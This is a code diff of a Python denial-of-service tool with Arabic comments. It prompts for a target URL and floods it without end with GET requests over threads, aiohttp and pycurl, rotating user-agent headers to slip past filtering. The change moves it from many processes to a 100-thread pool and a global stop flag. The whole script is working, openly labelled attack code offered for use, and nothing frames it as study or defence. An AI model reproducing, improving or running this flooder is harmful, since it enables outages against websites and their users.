@@ -1,5 +1,3 @@
-import time
-import multiprocessing
 import requests
 import aiohttp
 import asyncio
@@ -10,7 +8,7 @@ from io import BytesIO
 import random
 
 # متغير لتتبع حالة إيقاف الهجوم
-stop_attack_flag = multiprocessing.Value('b', False)
+stop_attack_flag = False
 
 # قائمة برؤوس HTTP مختلفة
 USER_AGENTS = [
@@ -36,43 +34,43 @@ def get_random_headers():
         "Accept-Encoding": "gzip, deflate, br",
     }
 
-def send_requests_threaded(target, stop_flag):
+def send_requests_threaded(target):
     session = requests.Session()
     
     def send_request():
-        while not stop_flag.value:
+        while not stop_attack_flag:
             try:
-                headers = get_random_headers()  # تغيير الرؤوس بشكل عشوائي
+                headers = get_random_headers()
                 session.get(target, headers=headers, timeout=5)
             except requests.exceptions.RequestException:
                 pass
 
-    num_threads = 10000  # زيادة عدد الخيوط بشكل كبير
+    num_threads = 100  # عدد الخيوط يمكن تعديله حسب قدرة الخادم
 
     with ThreadPoolExecutor(max_workers=num_threads) as executor:
         futures = [executor.submit(send_request) for _ in range(num_threads)]
         
         for future in futures:
-            if stop_flag.value:
+            if stop_attack_flag:
                 break
 
-async def send_requests_aiohttp(target, stop_flag):
+async def send_requests_aiohttp(target):
     async with aiohttp.ClientSession() as session:
-        while not stop_flag.value:
+        while not stop_attack_flag:
             try:
-                headers = get_random_headers()  # تغيير الرؤوس بشكل عشوائي
+                headers = get_random_headers()
                 async with session.get(target, headers=headers, timeout=5) as response:
                     await response.text()
             except aiohttp.ClientError:
                 pass
 
-def send_requests_pycurl(target, stop_flag):
-    while not stop_flag.value:
+def send_requests_pycurl(target):
+    while not stop_attack_flag:
         buffer = BytesIO()
         c = pycurl.Curl()
         c.setopt(c.URL, target)
         c.setopt(c.WRITEDATA, buffer)
-        headers = get_random_headers()  # تغيير الرؤوس بشكل عشوائي
+        headers = get_random_headers()
         c.setopt(c.HTTPHEADER, [f"{k}: {v}" for k, v in headers.items()])
         try:
             c.perform()
@@ -82,6 +80,7 @@ def send_requests_pycurl(target, stop_flag):
             c.close()
 
 def start_attack():
+    global stop_attack_flag
     try:
         target = input("Target URL: ")
         print("Attack will continue indefinitely. Type 'stop' to end it.")
@@ -90,38 +89,27 @@ def start_attack():
         print(f"Error: {str(e)}")
 
 def execute_attack(target):
-    total_cores = multiprocessing.cpu_count()
+    global stop_attack_flag
 
-    print(f"Starting continuous attack on {target} using {total_cores} cores...")
-
-    processes = []
-
-    with stop_attack_flag.get_lock():
-        stop_attack_flag.value = False
+    print(f"Starting continuous attack on {target}...")
 
     try:
-        # زيادة عدد العمليات بشكل كبير
-        for i in range(total_cores * 20):  # استخدام 20 عمليات لكل نواة
-            process = multiprocessing.Process(target=send_requests_threaded, args=(target, stop_attack_flag))
-            processes.append(process)
-            process.start()
+        # استخدام ThreadPoolExecutor للخيوط
+        with ThreadPoolExecutor() as executor:
+            executor.submit(send_requests_threaded, target)
 
+        # استخدام asyncio للبرمجة غير المتزامنة
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
-        loop.run_until_complete(send_requests_aiohttp(target, stop_attack_flag))
+        loop.run_until_complete(send_requests_aiohttp(target))
 
-        pycurl_process = multiprocessing.Process(target=send_requests_pycurl, args=(target, stop_attack_flag))
-        processes.append(pycurl_process)
-        pycurl_process.start()
+        # استخدام pycurl
+        send_requests_pycurl(target)
 
         print(Fore.YELLOW + "Attack in progress... Press Ctrl+C to stop." + Style.RESET_ALL)
 
-        for process in processes:
-            process.join()
-
     except KeyboardInterrupt:
-        with stop_attack_flag.get_lock():
-            stop_attack_flag.value = True
+        stop_attack_flag = True
         print(Fore.RED + "Attack stopped." + Style.RESET_ALL)
 
     except Exception as e:
